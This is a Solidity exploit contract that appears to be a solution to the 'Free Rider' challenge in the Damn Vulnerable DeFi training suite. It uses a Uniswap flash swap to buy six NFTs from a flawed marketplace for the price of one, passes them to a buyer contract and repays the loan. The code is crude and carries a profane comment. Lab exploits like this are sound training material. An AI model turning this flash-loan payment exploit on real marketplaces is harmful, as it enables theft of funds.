// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {FreeRiderBuyer} from "./FreeRiderBuyer.sol";
import {Address} from "openzeppelin-contracts/utils/Address.sol";
import {ReentrancyGuard} from "openzeppelin-contracts/security/ReentrancyGuard.sol";
import {DamnValuableNFT} from "../DamnValuableNFT.sol";
import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/free-rider/Interfaces.sol";
import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {WETH9} from "../../../src/Contracts/WETH9.sol";
import {FreeRiderNFTMarketplace} from "../../../src/Contracts/free-rider/FreeRiderNFTMarketplace.sol";
import "forge-std/console.sol";
import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";

/**
 * @title FreeRiderNFTMarketplace
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */

contract Attack is ReentrancyGuard, IERC721Receiver {
    FreeRiderBuyer internal freeRiderBuyer;
    FreeRiderNFTMarketplace internal freeRiderNFTMarketplace;
    DamnValuableToken internal dvt;
    DamnValuableNFT internal damnValuableNFT;
    IUniswapV2Pair internal uniswapV2Pair;
    IUniswapV2Factory internal uniswapV2Factory;
    IUniswapV2Router02 internal uniswapV2Router;
    WETH9 internal weth;

    uint256 internal constant NFT_PRICE = 15 ether;
    uint8 internal constant AMOUNT_OF_NFTS = 6;

    // Initial reserves for the Uniswap v2 pool
    uint256 internal constant UNISWAP_ATTACMER_TOKEN_NEEDED = 15_00e18;
    uint256 internal constant UNISWAP_ATTACKER_ETHER_NEEDED = 90 ether;
    uint256 internal constant DEADLINE = 10_000_000;

    // Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function
    function onERC721Received(address, address, uint256 _tokenId, bytes memory)
        external
        override
        nonReentrant
        returns (bytes4)
    {
        console.log("token id:", _tokenId);
        return this.onERC721Received.selector;
    }

    constructor(
        address _weth,
        address _uniswapV2Pair,
        address _freeRiderBuyer,
        address _freeRiderNFTMarketplace,
        address _damnValuableNFT
    ) {
        //set all variables
        weth = WETH9(payable(_weth));
        uniswapV2Pair = IUniswapV2Pair(_uniswapV2Pair);
        freeRiderBuyer = FreeRiderBuyer(_freeRiderBuyer);
        freeRiderNFTMarketplace = FreeRiderNFTMarketplace(payable(_freeRiderNFTMarketplace));
        damnValuableNFT = DamnValuableNFT(_damnValuableNFT);
    }

    //get ether from uniswap with flashswap
    //buy nfts in marketplace
    //set low price for NFTs offer all of them
    //buy them again for FUCKING ZERO
    //profit
    function execute() external {
        //do a flashswap
        console.log("test");
        bytes memory data = abi.encode(address(weth), msg.sender);

        uniswapV2Pair.swap(0, 90 ether, address(this), data);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external payable {
        uint256[] memory tokenIds = new uint256[](AMOUNT_OF_NFTS);
        uint256[] memory prices = new uint256[](AMOUNT_OF_NFTS);

        console.log("test2");
        for (uint8 i = 0; i < AMOUNT_OF_NFTS; i++) {
            tokenIds[i] = i;
            prices[i] = 0.001 ether;
        }

        damnValuableNFT.setApprovalForAll(address(freeRiderBuyer), true);

        weth.withdraw(90 ether);

        //buy nfts from marketplace
        freeRiderNFTMarketplace.buyMany{value: 15 ether}(tokenIds);

        damnValuableNFT.setApprovalForAll(address(freeRiderBuyer), true);
        for (uint8 i = 0; i < AMOUNT_OF_NFTS; i++) {
            damnValuableNFT.safeTransferFrom(address(this), address(freeRiderBuyer), i);
        }

        //log balance of nft of this
        uint256 totalToSendBack = (amount1 * 1000) / 997 + 1;
        weth.deposit{value: totalToSendBack}();
        weth.transfer(address(uniswapV2Pair), totalToSendBack);
    }

    //receive function
    receive() external payable {}
}
